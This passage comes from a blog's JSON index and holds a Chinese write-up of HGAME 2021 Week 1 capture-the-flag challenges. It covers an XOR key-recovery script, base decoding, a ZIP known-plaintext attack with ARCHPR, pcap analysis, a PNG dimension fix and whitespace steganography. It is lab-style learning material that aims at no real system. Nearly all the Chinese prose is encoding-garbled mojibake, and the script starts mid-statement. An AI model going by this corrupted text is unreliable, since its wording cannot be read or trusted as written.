table[j])) de0.append(xor(cipher19[15], table[j])) de0.append(xor(cipher20[15], table[j])) de0.append(xor(cipher21[15], table[j])) de0.append(xor(cipher22[15], table[j])) de0.append(xor(cipher23[15], table[j])) de0.append(xor(cipher24[15], table[j])) de0.append(xor(cipher25[15], table[j])) de0.append(xor(cipher26[15], table[j])) de0.append(xor(cipher27[15], table[j])) de0.append(xor(cipher28[15], table[j])) de0.append(xor(cipher29[15], table[j])) de0.append(xor(cipher30[15], table[j])) de0.append(xor(cipher31[15], table[j])) de0.append(xor(cipher32[15], table[j])) de0.append(xor(cipher33[15], table[j]))for j in de0: c[j] = c[j] + 1for j in range(0, 128): if c[j] == 34: print(j) â€‹ çŸ¥é“å‰16ä½æ˜æ–‡ï¼Œé‚£å°±å¯ä»¥æ±‚å¾—ä¸€ç»„ key ï¼Œå¹¶å¾—åˆ° flagï¼Œè¿‡ç¨‹åŒæ ·æ˜¯å†™è„šæœ¬ â€‹ Get flag! 3.Transformer â€‹ ä¸‹è½½ï¼Œå‘ç°å…¶ä¸­ä¸€ä¸ªæ–‡ä»¶ä¸­æœ‰flagå½¢å¼çš„å­—ç¬¦ä¸²ï¼Œè¿˜æœ‰ä¸¤ä¸ªæ–‡ä»¶åˆ†åˆ«å­˜å‚¨æ˜æ–‡å’Œå¯†æ–‡ï¼Œè™½ç„¶é¡ºåºæ˜¯æ‰“ä¹±äº†çš„ â€‹ æ¥ä¸‹æ¥å°±é‡‡ç”¨ä¼ ç»Ÿçš„äººå·¥æŸ¥æ‰¾æ˜æ–‡å’Œå¯†æ–‡ä¸€ä¸€å¯¹åº”çš„æ–¹å¼å¾—åˆ°flag â€‹ å½“ç„¶é‚£ä¸ª txt æ–‡ä»¶æœ€åè§£å¯†è¿˜æç¤º flag åé¢è¦åŠ ä¸Šå¹´ä»½2021æ‰æ­£ç¡® ï¼ˆæœäº†ä¸€ä¸‹é¢˜ç›®å‘ç°æ˜¯äººå·¥æ™ºèƒ½æ¨¡å‹ï¼Œæˆ‘åªæœ‰äººå·¥æ²¡æœ‰æ™ºèƒ½â€¦ï¼‰ crypto æ€»ç»“ï¼šæ²¡æƒ³åˆ°æœ€åç«Ÿæ˜¯ç¬¬ä¸€é¢˜æ²¡è§£å‡ºæ¥ï¼Œæœ¬æ¥ä»¥ä¸ºç¬¬äºŒé¢˜è§£ä¸å‡ºæ¥åè€Œè§£å‡ºæ¥äº†ã€‚è¿™å‘¨ç¨å¾®å­¦äº†ç‚¹æ€æ ·å†™è§£å¯†è„šæœ¬ï¼Œæ”¶è·æŒºå¤§ 5.misc 1.Baseå…¨å®¶ç¦ â€‹ é¢˜ç›®ä¸­æåˆ° baseå®¶æ—ï¼ŒæŸ¥èµ„æ–™å¾—çŸ¥æœ‰ä¸åªæœ‰ base64 ï¼Œå†æ ¹æ®ä¸åŒ base åŠ å¯†å­—ç¬¦çš„ç‰¹å¾å¤šæ¬¡è§£å¯† â€‹ å¦‚å›¾æ‰€ç¤ºï¼Œå¾—åˆ° flag 2.ä¸èµ·çœ¼å‹ç¼©åŒ…çš„å…»æˆçš„æ–¹æ³• â€‹ æ‰“å¼€å¾—åˆ°å›¾ç‰‡ï¼Œé¢˜ç›®ä¸­æåˆ°äº†å‹ç¼©åŒ…ï¼ŒçŒœæµ‹èƒ½ä»å›¾ç‰‡ä¸­å¾—åˆ°å‹ç¼©åŒ…ï¼Œäºæ˜¯åœ¨ linux ä¸­ç”¨ binwalk æ£€æµ‹å‘ç°äº†å‹ç¼©åŒ…ï¼Œå¹¶ç”¨ foremost å‘½ä»¤åˆ†ç¦»å‡ºæ¥ â€‹ åˆ†ç¦»è§£å‹åå¾—åˆ° â€‹ å‘ç°å¾—åˆ°é‡Œé¢çš„æ–‡ä»¶éœ€è¦å¯†ç ï¼Œé‚£å°±ç”¨ç™¾åº¦è¯†å›¾æ¥è·å–ä¹‹å‰å¾—åˆ°çš„å›¾ç‰‡çš„pç«™idè§£å¯†ã€‚ä¹‹åç‚¹è¿›plain.zipå‘ç°åˆéœ€è¦å¯†ç ï¼Œå¹¶ä¸”å‘ç°plain.zipé‡Œæœ‰flag.zipå’Œç›¸åŒçš„NO PASSWORD.txtæ–‡ä»¶ï¼ŒçŒœæµ‹æ˜¯åˆ©ç”¨æ˜æ–‡æ”»å‡»è§£å¯†ï¼Œç”¨ç›¸åŒçš„æ–¹å¼å‹ç¼©å·²å¾—åˆ°çš„NO PASSWORD.txtã€‚ â€‹ æ ¹æ®æç¤ºstorageï¼Œç”¨ä»…å­˜å‚¨çš„æ–¹å¼å‹ç¼©ï¼ˆåˆšå¼€å§‹ä¸çŸ¥é“storageæ˜¯å­˜å‚¨ç­‰çº§æ‰€ä»¥å¡äº†ä¸€ä¼šå„¿ï¼Œé—®äº†å­¦é•¿åæ‰çŸ¥é“ï¼‰ å†ç”¨ARCHPRè¿›è¡Œç ´è§£ï¼Œå¾—åˆ°å£ä»¤å’Œå¯†é’¥ï¼Œæœ€åå¾—åˆ°flag.zipçš„å†…å®¹ã€‚16è¿›åˆ¶è½¬å­—ç¬¦ä¸²ï¼Œå¾—flag 3.Galaxy â€‹ æ‰“å¼€è¿æ¥ä¸‹è½½ï¼Œå¾—åˆ°ä»¥**.pcapng**ä¸ºåç¼€çš„æ–‡ä»¶ï¼Œä¹‹åç”¨ wireshark æ‰“å¼€ â€‹ å¦‚å›¾æ‰€ç¤ºï¼Œå¯¼å‡º http æµ â€‹ æ‰¾åˆ°äº†é—å¤±çš„ galaxy å›¾ç‰‡ï¼Œåœ¨ windows ä¸‹èƒ½æ­£å¸¸æ‰“å¼€ï¼Œä½†ä¹‹åæŠŠå›¾ç‰‡æ”¾åˆ° linux ä¸­ï¼Œæƒ³ç”¨ binwalk åˆ†æçš„æ—¶å€™å‘ç°åœ¨ Linux ä¸‹æ— æ³•æ‰“å¼€å›¾ç‰‡ã€‚ â€‹ ä¸Šç½‘æŸ¥èµ„æ–™å¾—çŸ¥å›¾ç‰‡çš„é«˜å’Œå®½å¯èƒ½è¢«ä¿®æ”¹ï¼Œä¸åŸæ¥ crc å€¼ä¸åŒ¹é…æ‰æŠ¥é”™ã€‚äºæ˜¯åœ¨ç½‘ä¸Šæ‰¾äº†ä¸ªè„šæœ¬ï¼Œå¾—åˆ°æ­£ç¡®çš„é«˜å®½ ![](HGAME-Week1-writeup/misc3 (2).png) â€‹ ç„¶åå°±ç”¨ winhex ä¿®æ”¹é«˜å’Œå®½å¹¶ä¿å­˜ â€‹ å¾—åˆ° flagï¼ 4.Word RE:MASTER â€‹ ä¸‹è½½å¾—ä¸¤ä¸ªæ–‡æ¡£ï¼Œå‘ç°å…¶ä¸­ä¸€ä¸ªæ–‡æ¡£åŠ å¯†äº†ï¼Œé‚£å°±å…ˆæ‰“å¼€å¦ä¸€ä¸ªæ–‡æ¡£ â€‹ åœ¨ first.docx æ–‡æ¡£ä¸­å‘ç°äº† brain å’Œ fuck ä¸¤ä¸ªå•è¯ï¼ŒçŒœæµ‹æœ‰brainfuck åŠ å¯†ï¼Œä½†æ˜¯ä¹‹åå› ä¸ºä¸çŸ¥é“å¯†æ–‡å¡äº†å¾ˆä¹…ï¼Œå°è¯•ç”¨ winhex æ‰“å¼€å¦ä¸€ä¸ªæ–‡æ¡£å¾—åˆ° â€‹ æˆ‘ä»¥ä¸ºè¿™å°±æ˜¯å¯†æ–‡äº†ï¼Œäºæ˜¯å°±å¼€å¿ƒçš„æ‹¿å»è§£å¯†ç½‘ç«™è§£å¯†ï¼ˆå½“ç„¶è¿™æ˜¯é”™çš„ï¼‰ â€‹ é—®äº†Akira å­¦é•¿åå‘ç°è¿™å¯†æ–‡ç¼ºå°‘äº†å‰åŠéƒ¨åˆ†ï¼Œåªèƒ½è½¬ç”¨åˆ«çš„æ–¹æ³•ã€‚é¦–å…ˆå°è¯•æŠŠç¬¬ä¸€ä¸ªæ–‡æ¡£çš„åç¼€æ”¹ä¸º zip ï¼Œæ‰“å¼€åç«Ÿå‘ç° â€‹ â€‹ ä¸¢åˆ°ç½‘ç«™è§£å¯†åå¾—åˆ° DOYOUKNOWHIDDEN? ï¼Œç”¨è¿™ä¸ªæ‰“å¼€ç¬¬äºŒä¸ªæ–‡æ¡£ â€‹ å› ä¸ºè¿™ä¸ªæ–‡æ¡£å¯†ç æ˜¯ DOYOUKNOWHIDDEN? ï¼Œæ‰€ä»¥ç«‹é©¬æ˜¾ç¤º word çš„éšè—å­—ç¬¦ï¼Œå¾—åˆ° â€‹ ä¸€å †ç©ºç™½å­—ç¬¦ï¼Œç”±ç©ºæ ¼å’Œåˆ¶è¡¨ç¬¦ç»„æˆï¼Œè¿™é‡Œæˆ‘ç”¨ç®­å¤´å’Œç‚¹è¡¨ç¤º â€‹ è¿™ä¹‹åå°±å¡äº†å¾ˆä¹…ï¼ˆå¤§æ¦‚ä¸€å¤©å¤šâ€¦ï¼‰ï¼Œæˆ‘ç”šè‡³å°è¯•ç”¨äºŒè¿›åˆ¶01è¡¨ç¤ºï¼Œå®åœ¨æƒ³ä¸å‡ºæ¥äº†äºæ˜¯å»é—®å­¦é•¿ï¼Œæç¤ºæˆ‘æœä¸€ä¸‹ç¬¬äºŒä¸ªæ–‡æ¡£å›¾ç‰‡ä¸­å‡ºç°æœ€å¤šçš„å­—çš„è‹±æ–‡ï¼ˆä¹‹å‰ä¸€ç›´ç›¯ç€å›¾ç‰‡å†…å®¹çœ‹ï¼Œä»¥ä¸ºhintæ˜¯éŸ³æ¸¸æ¢—ï¼Œæœç„¶æ˜¯æˆ‘æƒ³å¤ªå¤šorzï¼‰ â€‹ æ¥ç€å°±æœç´¢snowï¼ŒçŸ¥é“äº†ç©ºç™½å­—ç¬¦çš„éšå†™ï¼Œä¸Šå·¥å…·è§£å¯† miscæ€»ç»“ï¼šæ‹¿åˆ°é¢˜ç›®åå®Œå…¨æ²¡æ€è·¯ï¼Œæ‰€ä»¥åœ¨è¿™ä¸€å‘¨ä¸­æŸ¥äº†å¾ˆå¤šèµ„æ–™ï¼Œè§‰å¾—è‡ªå·±å°±æ˜¯ä¸ªèœé¸¡ï¼Œå¥½åœ¨æœ€åå…¨éƒ¨è§£äº†å‡ºæ¥ï¼Œä¹Ÿå­¦åˆ°äº†å¾ˆå¤šä¸œè¥¿","link":"/2021/03/26/HGAME-Week1-writeup/"}],"tags":[{"name":"re","slug":"re","link":"/tags/re/"},{"name":"wp","slug":"wp","link":"/tags/wp/"},{"name":"hgame","slug":"hgame","link":"/tags/hgame/"},{"name":"pwn","slug":"pwn","link":"/tags/pwn/"},{"name":"windows","slug":"windows","link":"/tags/windows/"},{"name":"åè°ƒè¯•","slug":"åè°ƒè¯•","link":"/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/"},{"name":"idapython","slug":"idapython","link":"/tags/idapython/"},{"name":"csapp","slug":"csapp","link":"/tags/csapp/"}],"categories":[{"name":"Hgame2021","slug":"Hgame2021","link":"/categories/Hgame2021/"}]}